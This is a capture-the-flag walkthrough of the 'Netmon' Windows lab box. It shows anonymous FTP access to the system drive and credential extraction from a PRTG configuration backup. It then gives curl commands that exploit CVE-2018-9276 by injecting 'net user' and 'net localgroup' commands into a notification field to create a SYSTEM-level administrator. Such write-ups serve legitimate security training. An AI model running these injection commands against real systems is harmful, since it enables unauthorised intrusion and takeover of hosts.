## Overview

Netmon is an Easy Windows box running Paessler PRTG Network Monitor. Anonymous FTP is mapped to the whole `C:\` drive, which hands over `user.txt` and PRTG's stored admin credentials. A predictable password rotation gets you into the PRTG web panel, and authenticated command injection ([CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276)) — running as `SYSTEM` — creates a local administrator that reads `root.txt` over WinRM.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP (Microsoft ftpd) | anonymous login, `C:\` readable |
| 80 | HTTP | PRTG Network Monitor 18.1.37.13946 |
| 135/139/445 | RPC / SMB | Windows |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |

```bash
nmap -sC -sV 10.129.35.208
```

The FTP banner reveals anonymous access, and port 80 fingerprints as PRTG 18.1.37 — an old, vulnerable version. Those two facts define the whole path.

## Enumeration

Anonymous FTP root is the actual system drive:

```bash
ftp -inv 10.129.35.208
# user anonymous anonymous
# ls  ->  inetpub, Program Files, Users, Windows ...
```

PRTG stores its configuration — including passwords — under `C:\ProgramData\Paessler\PRTG Network Monitor\`, all reachable over the same anonymous FTP.

![prtg-creds](/assets/Images/netmon-003_enum_loot-prtg-creds.png)

## Foothold

Grab `user.txt` from the Public desktop:

```bash
ftp -inv 10.129.35.208
# cd Users/Public/Desktop ; get user.txt
```

![user-flag](/assets/Images/netmon-001_foothold_user-flag.png)

Pull PRTG's config backup and read the stored admin password:

```bash
ftp -inv 10.129.35.208
# cd "ProgramData/Paessler/PRTG Network Monitor"
# binary ; get "PRTG Configuration.old.bak"
grep -aA1 -i dbpassword "PRTG_Configuration.old.bak"
```

The backup (from 2018) yields `prtgadmin : PrTg@dmin2018`. That value is stale, but the box was reset in 2019 and the password was only bumped by a year — `PrTg@dmin2019` authenticates:

```bash
curl 'http://10.129.35.208/api/table.json?content=sensortree&username=prtgadmin&password=PrTg@dmin2019'   # HTTP 200
```

![prtg-login](/assets/Images/netmon-004_foothold_prtg-login-2019.png)

## User flag

```bash
cat Users/Public/Desktop/user.txt   # HTB{...}
```

Access as the PRTG admin (`prtgadmin`) on the web panel, and `user.txt` in hand.

## Privilege Escalation

PRTG 18.1.37 is vulnerable to [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) — an authenticated [OS command injection](https://cwe.mitre.org/data/definitions/78.html) in the notification system. A notification of type "Execute Program" passes its parameter field to PowerShell unsanitised, and the PRTG probe runs as `NT AUTHORITY\SYSTEM`.

Log in for a session cookie:

```bash
curl -i http://10.129.35.208/public/checklogin.htm \
  --data-urlencode 'username=prtgadmin' \
  --data-urlencode 'password=PrTg@dmin2019' \
  --data-urlencode 'loginurl=/index.htm'
# Set-Cookie: OCTOPUS1813713946=...
```

Create a malicious notification whose parameter injects `net user`/`net localgroup` after a `;`:

```bash
COOKIE='OCTOPUS1813713946=...'
curl -H "X-Requested-With: XMLHttpRequest" -b "$COOKIE" \
  --data 'name_=inj&active_10=10&address_10=Demo+EXE+Notification+-+OutFile.ps1&timeout_10=60&objecttype=notification&id=new' \
  --data-urlencode 'message_10="C:\Users\Public\t.txt;net user pentest <pass> /add;net localgroup administrators pentest /add"' \
  http://10.129.35.208/editsettings
```

Find the new notification id, then trigger it so PRTG executes the payload as SYSTEM:

```bash
curl -b "$COOKIE" 'http://10.129.35.208/api/table.json?content=notifications&columns=objid,name&username=prtgadmin&password=PrTg@dmin2019'
curl -H "X-Requested-With: XMLHttpRequest" -b "$COOKIE" --data 'id=2018' http://10.129.35.208/api/notificationtest.htm
```

![cmd-injection](/assets/Images/netmon-005_exploit_cve-2018-9276-inject.png)

The new `pentest` account is a local administrator, so WinRM gives a shell:

```bash
nxc winrm 10.129.35.208 -u pentest -p '<pass>' -x 'whoami'
```

## Root flag

```bash
nxc winrm 10.129.35.208 -u pentest -p '<pass>' -x 'type C:\Users\Administrator\Desktop\root.txt'   # HTB{...}
```

![root-flag](/assets/Images/netmon-002_priv_esc_root-flag.png)

Full compromise — the injected commands ran as SYSTEM, and the new admin reads `root.txt`.
